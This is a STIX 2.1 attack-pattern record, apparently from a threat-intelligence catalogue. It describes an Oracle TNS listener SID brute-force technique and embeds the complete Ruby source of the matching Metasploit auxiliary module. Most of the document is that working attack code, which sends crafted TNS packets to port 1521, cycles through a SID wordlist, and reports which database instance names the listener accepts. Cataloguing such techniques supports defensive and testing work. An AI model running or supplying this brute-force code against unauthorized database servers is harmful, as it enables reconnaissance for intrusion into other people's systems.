{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--02093ad8-28a3-48d8-b4c6-0e0a5fb913bd",
    "created": "2024-08-14T16:27:56.00332Z",
    "modified": "2024-08-14T16:27:56.003324Z",
    "name": "Oracle TNS Listener SID Bruteforce",
    "description": " This module queries the TNS listener for a valid Oracle database instance name (also known as a SID). Any response other than a \"reject\" will be considered a success. If a specific SID is provided, that SID will be attempted. Otherwise SIDs read from the named file will be attempted in sequence instead. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/oracle/sid_brute.rb",
            "external_id": "sid_brute.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::TNS\n  include Msf::Auxiliary::Report\n  include Msf::Auxiliary::Scanner\n  include Msf::Auxiliary::AuthBrute # Actually, doesn't use much here, but there's a couple handy functions.\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Oracle TNS Listener SID Bruteforce',\n      'Description'    => %q{\n        This module queries the TNS listener for a valid Oracle database\n        instance name (also known as a SID).\n        Any response other than a \"reject\" will be considered a success.\n        If a specific SID is provided, that SID will be attempted. Otherwise,\n        SIDs read from the named file will be attempted in sequence instead.\n      },\n      'Author'         => [ 'todb' ],\n      'License'        => MSF_LICENSE\n    ))\n\n    register_options(\n      [\n        OptPath.new('SID_FILE', [ false, \"File containing instance names, one per line\", File.join(Msf::Config.data_directory, \"wordlists\", \"sid.txt\") ]),\n        OptString.new('SID', [ false, 'A specific SID to attempt.' ]),\n        Opt::RPORT(1521)\n      ])\n\n    deregister_options(\n      \"USERNAME\", \"PASSWORD\", \"USER_FILE\", \"PASS_FILE\", \"USERPASS_FILE\",\n      \"BLANK_PASSWORDS\", \"USER_AS_PASS\", \"REMOVE_USER_FILE\", \"REMOVE_PASS_FILE\",\n      \"REMOVE_USERPASS_FILE\"\n    )\n  end\n\n  def build_sid_request(sid,ip)\n    connect_data = \"(DESCRIPTION=(CONNECT_DATA=(SID=#{sid})(CID=(PROGRAM=)(HOST=__jdbc__)(USER=)))(ADDRESS=(PROTOCOL=tcp)(HOST=#{ip})(PORT=#{rport})))\"\n    pkt = tns_packet(connect_data)\n  end\n\n  def hostport\n    [target_host,rport].join(\":\")\n  end\n\n  def check_sid(sid,ip)\n    pkt = build_sid_request(sid,ip)\n    sock.put(pkt)\n    data = sock.get_once || ''\n    parse_response(data)\n  end\n\n  def parse_response(data)\n    return unless data\n    len,sum,type,r,hsum,rest = data.unpack(\"nnCCnA*\")\n    type # 2 is \"accept\", 11 is resend. Usually you get 11, then 2. 4 is refuse.\n  end\n\n  def do_sid_check(sid,ip)\n    begin\n      connect\n      response_code = check_sid(sid,ip)\n      if response_code.nil?\n        print_status \"#{hostport} Oracle - No response given, something is wrong.\"\n        return :abort\n      elsif response_code != 4\n        print_good \"#{hostport} Oracle - '#{sid}' is valid\"\n        report_note(\n          :host => ip,\n          :proto => 'tcp',\n          :port => rport,\n          :sname => 'oracle',\n          :type => \"oracle.sid\",\n          :data => sid,\n          :update => :unique_data\n        )\n        return :success\n      else\n        vprint_status \"#{hostport} Oracle - Refused '#{sid}'\"\n        return :fail\n      end\n    rescue ::Rex::ConnectionError, ::Errno::EPIPE\n      print_error(\"#{hostport} Oracle - unable to connect to a TNS listener\")\n      return :abort\n    ensure\n      disconnect\n    end\n  end\n\n  # Based vaguely on each_user_pass in AuthBrute\n  def each_sid(&block)\n    @@oracle_sid_fail = []\n    @@oracle_sid_success = []\n    if datastore['SID'].nil? || datastore['SID'].empty?\n      sids = extract_words(datastore['SID_FILE']).map {|s| s.to_s.strip.upcase}.uniq\n    else\n      sids = [datastore['SID'].to_s.strip.upcase]\n    end\n    print_status \"Checking #{sids.size} SID#{sids.size != 1 && \"s\"} against #{hostport}\"\n    sids.each do |s|\n      userpass_sleep_interval unless (@@oracle_sid_fail | @@oracle_sid_success).empty?\n      next if @@oracle_sid_fail.include?(s) || @@oracle_sid_success.include?(s)\n      ret = block.call(s)\n      case ret\n      when :abort\n        break\n      when :success\n        @@oracle_sid_success << s\n        break if datastore[\"STOP_ON_SUCCESS\"]\n      when :fail\n        @@oracle_sid_fail << s\n      end\n    end\n  end\n\n  def run_host(ip)\n    each_sid do |sid|\n      vprint_status \"#{hostport} Oracle - Checking '#{sid}'...\"\n      do_sid_check(sid,ip)\n    end\n  end\nend\n"
}